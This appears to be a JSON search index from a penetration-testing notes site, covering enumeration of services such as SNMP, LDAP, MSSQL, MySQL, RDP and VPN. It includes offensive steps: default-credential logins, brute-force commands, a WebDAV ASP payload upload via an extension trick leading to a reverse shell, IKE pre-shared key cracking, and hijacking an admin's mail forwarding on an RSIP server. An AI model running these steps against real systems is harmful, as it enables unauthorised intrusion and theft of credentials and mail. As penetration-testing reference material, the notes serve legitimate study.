	"content": " Table of Content  Hashcat Cheatsheet John Cheatsheet Cracking Files  "
},
{
	"uri": "/web-attacks/postman/",
	"title": "Postman",
	"tags": [],
	"description": "",
	"content": " https://www.guru99.com/postman-tutorial.html https://openclassrooms.com/fr/courses/4668056-construisez-des-microservices/5123020-testez-votre-api-grace-a-postman https://www.toolsqa.com/postman-tutorial/ https://amethyste16.wordpress.com/2016/02/24/tutoriel-postman/ User Interface Header # Import --\u0026gt; Used to import collection or environment. # Runner --\u0026gt; Automation tests can be executed through the Collection Runner. # Workspace --\u0026gt; You can divide work using workspaces Sidebar # History --\u0026gt; Past requests that you have sent will be displayed in History. # This makes it easy to track actions that you have done. # Organize --\u0026gt; your test suite by creating collections. # Each collection may have subfolders and multiple requests. # A request or folder can also be duplicated as well Request zone # Request tab --\u0026gt; Display the current request # HTTP method to use # Endpoint (URL) # Save --\u0026gt; If there are changes to a request, clicking save is a must so that new # changes will not be lost or overwritten # Params --\u0026gt; GET or POST... # Authorization --\u0026gt; If you have to use bearer token, username/password etc... # Headers --\u0026gt; To set headers such as content type JSON \nGET and POST Requests # GET Requests # Set your HTTP request to GET. # In the request URL field, input link (including parameters) # Click Send # You will see 200 OK Message# POST Requests # Set your HTTP request to POST. # Input the link # Switch to the Body tab # Use for example raw and choose the type (JSON ?) # Copy and paste just one user result and change for example the ID to request another user # Click Send. # Status: 201 Created should be displayed # Posted data are showing up in the body \nRequest Parameterization # Data Parameterization is one of the most useful features of Postman. # Instead of creating the same requests with different data, you can use variables with parameters. # These data can be from a data file or an environment variable. # Parameterization helps to avoid repetition of the same tests and iterations # can be used for automation testing. # Parameters are created through the use of double curly brackets: {{sample}}.# Set your HTTP request to GET # {{url}}/users --\u0026gt; No result because the environment is not set # Click the eye # Click edit to set the variable to a global environment which can be used in all collections. # set the name to the url which is your https://domain.com # Go back to your Get request then click send. There should now be results for your request. "
},
{
	"uri": "/recon-enumeration/services-enumeration/143_imap/",
	"title": "143 - IMAP",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Nmap scan nmap -v -sV --version-intensity=5 --script imap-capabilities -p T:143 \u0026lt;IP\u0026gt; # Banner grabbing telnet \u0026lt;IP\u0026gt; 143 # Banner grabbing and test connection nc -nv IP 143 A1 LOGIN “root” “” A1 LOGIN root toor A1 LOGIN root root"
},
{
	"uri": "/cryptography/",
	"title": "Cryptography",
	"tags": [],
	"description": "",
	"content": " Table of Content  RSA Encryption AES Encryption MISC  "
},
{
	"uri": "/recon-enumeration/services-enumeration/161_162_snmp/",
	"title": "161/162 - SNMP",
	"tags": [],
	"description": "",
	"content": " Resources https://blog.cedrictemple.net/239-faire-des-requetes-snmp-en-ligne-de-commande-sous-linux/ \nIdentification \u0026amp; Scans nmap -vv -sV --version-intensity=5 -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes IP \nSnmpwalk snmpwalk -c public -v1 IP 1 \u0026gt; snmpwalk.txt Windows RUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2 Windows INSTALLED SOFTWARE 1.3.6.1.2.1.25.6.3.1.2 Windows SYSTEM INFO 1.3.6.1.2.1.1.1 Windows HOSTNAME 1.3.6.1.2.1.1.5 Windows DOMAIN 1.3.6.1.4.1.77.1.4.1 Windows UPTIME 1.3.6.1.2.1.1.3 Windows USERS 1.3.6.1.4.1.77.1.2.25 Windows SHARES 1.3.6.1.4.1.77.1.2.27 Windows DISKS 1.3.6.1.2.1.25.2.3.1.3 Windows SERVICES 1.3.6.1.4.1.77.1.2.3.1.1 Windows LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0 Windows LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0 Linux RUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2 Linux SYSTEM INFO 1.3.6.1.2.1.1.1 Linux HOSTNAME 1.3.6.1.2.1.1.5 Linux UPTIME 1.3.6.1.2.1.1.3 Linux MOUNTPOINTS 1.3.6.1.2.1.25.2.3.1.3 Linux RUNNING SOFTWARE PATHS 1.3.6.1.2.1.25.4.2.1.4 Linux LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0 Linux LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0 Community: admin manager public private \nOneSixtyOne # Scanning using onesixtyone (get existing communities) $ onesixtyone -c \u0026lt;dictCommunity.txt\u0026gt; -i \u0026lt;ip.txt\u0026gt;"
},
{
	"uri": "/pwn/",
	"title": "Pwn",
	"tags": [],
	"description": "",
	"content": " Table of Content  Buffer Overflow  "
},
{
	"uri": "/recon-enumeration/services-enumeration/389_636_3269_ldap/",
	"title": "389/636/3269 - LDAP",
	"tags": [],
	"description": "",
	"content": " General Informations # Ports 389 - LDAP 636 - LDAPS (SSL) 3269 - LDAP Global Catalog # Architecture (LDAP is hierarchical) - DC = Domain Component, the domain name - OU = Organizational Unit, \\\u0026#34;folders - CN = Common Name, the name fiven to the objects (Username, Group name, Computer name, etc.) # Research syntax ldapsearch \u0026lt;bind options\u0026gt; -b \u0026lt;base to search from\u0026gt; \u0026lt;search filter\u0026gt; \u0026lt;attributes\u0026gt; # Interesting attributes for user class ldapsearch “(objectClass=user)” interesting attributes: - sAMAccountName - userPrincipalName - memberOf (groups) - badPwdCount (failed logins) - lastLogoff (timestamp) - lastLogon (timestamp) - pwdLastSet (timestamp) - logonCount # Interesting attributes for group class ldapsearch “(objectClass=group)” interesting attributes: - cn - member (one per user/group) - memberOf (if nested in another group) # Interesting attributes for computer class ldapsearch “(objectClass=computer)” interesting attributes: - name (NetBIOS name) - DNSHostName (FQDN) =\u0026gt; combine it with DNS lookups and you can enumerate every IP address in the domain without scanning - operatingSystem - operatingSystemVersion (patch level) - lastLogonTimestamp - servicePrincipalName (running services =\u0026gt; TERMSRV, HTTP, MSSQL) \nFacing Active Directory # Research ldapsearch -LLL -x -H ldap://pdc01.lab.ropnop.com -b ‘’ -s base ‘(objectclass=*)’ # Windapsearch is a good tool to automate the job (https://github.com/ropnop/windapsearch)"
},
{
	"uri": "/wireless/",
	"title": "Wireless",
	"tags": [],
	"description": "",
	"content": " Table of Content  WiFi Cracking  "
},
{
	"uri": "/recon-enumeration/services-enumeration/995_pop3s/",
	"title": "995 - POP3S",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION) nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:995 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:995 IP \nSSL Checking # Using openssl openssl s_client -connect IP:995 \nAuthentication Checking (classical credentials) USER admin PASS admin USER root PASS root USER root PASS toor"
},
{
	"uri": "/recon-enumeration/services-enumeration/1025_nfs_iis/",
	"title": "1025 - NFS/IIS",
	"tags": [],
	"description": "",
	"content": " Identification and Checking # Check on the Web port (80 ?): # _vti_pvt for OSCP /_vti_pvt/access.cnf /_vti_pvt/service.cnf /_vti_inf.htm \nWebDAV Exploitation using Metasploit # Checking WebDAV using metasploit use auxiliary/scanner/http/webdav_scanner set rhosts \u0026lt;IP\u0026gt; run # Content discovery using metasploit use auxiliary/scanner/http/webdav_website_content set rhosts \u0026lt;IP\u0026gt; run # Checking authentication using metasploit use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass set rhosts \u0026lt;IP\u0026gt; run # Upload exploitation using metasploit use exploit/windows/iis/iis_webdav_upload_asp \nManual WebDAV exploitation (cadaver) cadaver http://IP/ # Goal is to upload file on IIS Server. ls # Find a directory where we can upload. cd \u0026lt;path\u0026gt; # Test for upload put /path/to/test.asp test.asp # Upload payload put /path/to/payload.asp longnamebrotesttest123456789.txt # Copy and rename payload copy longnamebrotesttest123456789.txt longnamebrotesttest123456789.asp;.txt # Access (should execute the ASP content) http://IP/_vti_pvt/longnamebrotesttest123456789.asp%3b.txt # Then go for reverse shell"
},
{
	"uri": "/recon-enumeration/services-enumeration/1433_mssql/",
	"title": "1433 - MSSQL",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -sT -Pn -p T:1433 --script=xxxx \u0026lt;IP\u0026gt; # Bruteforce accounts and password against a MSSQL Server ms-sql-brute # Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers,and configuration settings. # Credentials required ms-sql-config # Queries the Microsoft SQL Browser service for the DAC (Dedicated AdminConnection) ms-sql-dac # Dumps the password hashes from an MS-SQL server in a format suitable # Credentials required ms-sql-dump-hashes # Attempts to authenticate to Microsoft SQL Servers using an empty password forthe sysadmin (sa) account. ms-sql-empty-password # Queries Microsoft SQL Server (ms-sql) instances for a list of databases a user hasaccess to. # Credentials required ms-sql-hasdbaccess # Attempts to determine configuration and version information for Microsoft SQLServer instances ms-sql-info # Runs a query against Microsoft SQL Server (ms-sql). # Credentials required. ms-sql-query # Queries Microsoft SQL Server (ms-sql) for a list of tables per database. # Credentials required ms-sql-tables # Attempts to run a command using the command shell of Microsoft SQL Server (ms-sql) # Credentials required ms-sql-xp-cmdshell"
},
{
	"uri": "/recon-enumeration/services-enumeration/1721_vpn/",
	"title": "1721 - VPN",
	"tags": [],
	"description": "",
	"content": " Resources https://github.com/0x90/vpn-arsenal https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/ \nExploitation Techniques # IKEv2 Authenthication IP spoofing ike-scan --sport=1723 --dport=1723 --sourceip=IP_To_Spoof --ikev2 \u0026lt;IP\u0026gt; # Trying all authentication modes ike-scan --dport=1723 --auth=1 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --auth=3 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --auth=64221 \u0026lt;IP\u0026gt; # IP spoofing using ike-scan ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=1 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=3 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=64221 \u0026lt;IP\u0026gt; # IP spoofing and agressive mode ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 \u0026lt;IP\u0026gt; # Show fingerprint ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 --showbackoff \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 --showbackoff \u0026lt;IP\u0026gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 --showbackoff \u0026lt;IP\u0026gt; # Crack the key using psk-crack psk-crack hash-file.txt psk-crack -b 5 IP psk-crack -b 5 --charset=\u0026#34;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#34; \u0026lt;IP\u0026gt; psk-crack -d wordlist.txt \u0026lt;IP\u0026gt;"
},
{
	"uri": "/recon-enumeration/services-enumeration/3306_mysql/",
	"title": "3306 - MySQL",
	"tags": [],
	"description": "",
	"content": " Basics # Try connection from outside mysql --host \u0026lt;IP\u0026gt; -u root -proot # Connection from the target machine mysql -u root -p root database \nClassical commands show databases; use database_name; show tables; describe table_name; select host, user, password from mysql.user; \nIdentification and Scan # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -Pn -p T:3306 --script=xxxx \u0026lt;IP\u0026gt; # Audits MySQL database server security configuration mysql-audit # Bruteforce accounts and password against a MySQL Server mysql-brute # Attempts to list all databases on a MySQL server. (creds required) mysql-databases #Dumps the password hashes from an MySQL server in a format suitable (creds required) mysql-dump-hashes # Checks for MySQL servers with an empty password for root or anonymous. mysql-empty-password # Performs valid-user enumeration against MySQL server using a bug mysql-enum # Connects to a MySQL server and prints information such as the protocol and version numbers, thread ID, status, capabilities, and the password salt. mysql-info # Runs a query against a MySQL database and returns the results as a table. (creds required) mysql-query # Attempts to list all users on a MySQL server. mysql-users # Attempts to show all variables on a MySQL server. mysql-variables # Attempts to bypass authentication in MySQL and MariaDB servers by exploiting CVE2012-2122. If its vulnerable, it will also attempt to dump the MySQL usernames and password hashes. mysql-vuln-cve2012-2122"
},
{
	"uri": "/recon-enumeration/services-enumeration/3389_rdp/",
	"title": "3389 - RDP",
	"tags": [],
	"description": "",
	"content": " Identification and Scans # Using nmap NSE scripts nmap -Pn -sV --version-intensity=5 -p T:3389 --script=xxxx \u0026lt;IP\u0026gt; # Determines which Security layer and Encryption level is supported by the RDP service rdp-enum-encryption # Checks if a machine is vulnerable to MS12-020 RDP vulnerability rdp-vuln-ms12-020.nse  \nCredentials bruteforce # Using ncrack for one user ncrack -vv -u nina -P passwords.txt rdp://IP # Using ncrack for several users ncrack -vv -U users.txt -P passwords.txt rdp://IP \nConnexion # Using rdesktop rdesktop -u \u0026#34;username\u0026#34; -p \u0026#34;password\u0026#34; -g 80% -r disk:share=/path/to/share/with/remote/host \u0026lt;IP\u0026gt; # Remmina is cool too"
},
{
	"uri": "/recon-enumeration/services-enumeration/4555_rsip/",
	"title": "4555 - RSIP",
	"tags": [],
	"description": "",
	"content": " Forwarding admin\u0026rsquo;s mails # Connection through netcat (can test for creds) nc -nv \u0026lt;IP\u0026gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax ***REMOVED*** # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.local"
},
{
	"uri": "/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
}]